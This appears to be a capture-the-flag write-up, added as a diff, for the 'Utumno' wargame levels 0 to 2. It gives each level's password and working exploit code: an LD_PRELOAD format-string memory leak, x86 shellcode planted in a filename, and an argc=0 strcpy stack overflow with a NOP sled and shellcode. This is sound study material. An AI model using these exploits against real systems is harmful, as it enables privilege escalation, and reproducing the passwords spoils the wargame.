@@ -1,0 +1,192 @@
+############################################### Utumno ############################################
+
+Level:     0
+Exploit:   LD_PRELOAD Memory Leaking
+Password:  ytvWa6DzmL
+
+$ ls -al utumno0
+---x--x--- 1 utumno1 utumno0 12212 Oct 14 09:28 utumno0
+
+$ ./utumno0
+Read me! :P
+
+The executable file is readonly. Cannot use gdb, ldd, ltrace & strace to analyze the binary 
+Executing the binary shows that the program prints.
+Because the program prints, it will likely use printf or puts libc function. Use LD_PRELOAD to 
+overwrite the puts() function. The overwritten function can leak memory using format string vuln.
+
+custom puts implementation:
+  #include <stdio.h>
+  int puts(const char* str) {
+		  printf("Leaking Memory Addrs: %08x %08x ...\n");
+			return 0;
+	}
+
+Generate shared object file
+$ gcc -m32 -c -fPIC custom_puts.c -o puts.o
+$ gcc -m32 -shared -o puts.so puts.o
+
+$ export LD_PRELOAD=/.../puts.so
+$ ./utumno0
+Leaking Memory Addrs: f7fdabb0 ffffd3c0 f7fbd159 0804907d f7fa8e34 ffffd398 0804917d 0804a01d 0804a008 00000000
+
+We find a few addresses that are in user space. Printout the memory locations as strings. Modify 
+the custom puts implementation to printf("%c", <addr>) for all user space addresses
+
+��
+���
+Read me! :P
+password: ytvWa6DzmL
+
+###################################################################################################
+
+Level:    1
+Exploit:  Reverse Engineering & Shellcoding
+Password: RdUzprHKSm
+
+$ ./utumno1
+Results in nothing. ltrace simply exits immediately. Disassemble main in gdb shows that program
+checks for one arg
+
+Check for calls before and after providing 1 argument
+$ ltrace ./utumno1
+__libc_start_main(0x80490dd, 1, 0xffffd474, 0 <unfinished ...>
+exit(1 <no return ...>
++++ exited (status 1) +++
+
+$ ltrace ./utumno1 a
+__libc_start_main(0x80490dd, 2, 0xffffd474, 0 <unfinished ...>
+mmap(0, 4096, 7, 34)                                                               = 0xf7fc0000
+opendir("a")                                                                       = 0
+exit(1 <no return ...>
++++ exited (status 1) +++
+
+Both the disassembly and ltrace show that the program attempts to call opendir on the argument
+When providing an argument to a valid directory ltrace looks like:
+$ ltrace ./utumno1 /tmp/u00
+__libc_start_main(0x80490dd, 2, 0xffffd474, 0 <unfinished ...>
+mmap(0, 4096, 7, 34)                                                               = 0xf7fc0000
+opendir("/tmp/u00")                                                                = 0x804c1a0
+readdir(0x804c1a0)                                                                 = 0x804c1bc
+strncmp("sh_", ".", 3)                                                             = 1
+readdir(0x804c1a0)                                                                 = 0x804c1cc
+strncmp("sh_", "..", 3)                                                            = 1
+readdir(0x804c1a0)                                                                 = 0
++++ exited (status 0) +++
+
+Disassembly & ltrace show that program iterates over the entires in directory and look for matching
+name to sh_. It is then calls run() on the entry name
+Add the shellcode after the sh_ in the filename.
+
+touch sh_$(perl -e 'print "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80
+\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71
+\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54
+\x8a\xe2\xce\x81"')
+
+###################################################################################################
+
+Level:    2
+Exploit:  Memory corruption from argc = 0
+Password: h3kVKJZuid
+
+Disassembling the program shows the following
+	int main(int argc, char *argv[]) {
+		if (argc == 0) {}             <--- this condition allows for progression  
+		else if (argc == 1) {
+			if (argv[0][0] == '\0') {}  <--- this condition allows for progression
+			else {
+				 puts("some string"); 
+				 exit(1);
+			}
+		} else {
+			puts("some string");  
+			exit(1);
+		}
+
+		strcpy((char *)(argv[0] + 0x28), (char *)( (char *)&argc - 12 )); <--- argv[0] will segfault
+		return 0;
+	}
+
+In order to launch the program with argc = 0, the only way is to execute with no args from another 
+program
+	#include <unistd.h>
+	int main() {
+		char *args[] = { NULL };
+		char *envp[] = {
+      "AAAA",
+			...
+      NULL
+		};
+		execve("/utumno/utumno2", args, envp);
+		return 0;
+	}
+
+Important note is that argc, argv, and envp are all contiguous on the stack. Because argv is null, argv[1]
+simply reads from environment variable
+
+    Lower address
++-------------------+ <---- the initial stack pointer
+|       argc        |
++-------------------+
+|      argv[0]      |  -> points to the null-terminated first argument
++-------------------+
+|      argv[1]      |  -> points to the null-terminated second argument
++-------------------+
+|       ...         |
++-------------------+
+|   argv[argc-1]    |  -> points to the null-terminated last argument
++-------------------+
+|       NULL        |
++-------------------+
+|      envp[0]      |  -> points to the null-terminated first environment variable
++-------------------+
+|      envp[1]      |  -> points to the null-terminated second environment variable
++-------------------+
+|       ...         |
++-------------------+
+|      envp[N]      |  -> points to the null-terminated last environment variable
++-------------------+
+|       NULL        |
++-------------------+
+   Higher address
+
+This allows us to reach the strcpy. 
+$ ltrace ./launcher
+__libc_start_main(0x5655619d, 1, 0xffffd474, 0 <unfinished ...>
+execve(0x56557030, 0xffffd374, 0xffffd378, 0x565561b4 <no return ...>
+--- Called exec() ---
+__libc_start_main(0x804909d, 1, 0xffffdea4, 0 <unfinished ...>
+strcpy(0xffffddcc, "IIII" <no return ...>
+
+The strcpy will be able to overwrite the return address
+Constructing envp variable 9, which the program copies to be AAAABBBBCCCCDDDDEEEE...
+shows that the program segfaults on 0x45454545. This means that the 16 - 20th bytes of the 9th environment 
+variable overwrites the return address.
+We can place shellcode after the return address location. The new return address can now point to the shellcode
+
+Finalize program to execute priviledge execution
+	int main() {
+		char *args[] = { NULL };
+    char *envp[] = {
+      "JUNK",
+      "JUNK",
+      "JUNK",
+      "JUNK",
+      "JUNK",
+      "JUNK",
+      "JUNK",
+      "JUNK",
+      "AAAABBBBCCCCDDDD\xa0\xdd\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81",
+      NULL
+    };
+    execve("/utumno/utumno2", args, envp);
+    return 0;
+  }
+
+###################################################################################################
+
+Level:    3
+Exploit:  
+Password: 
+
+###################################################################################################
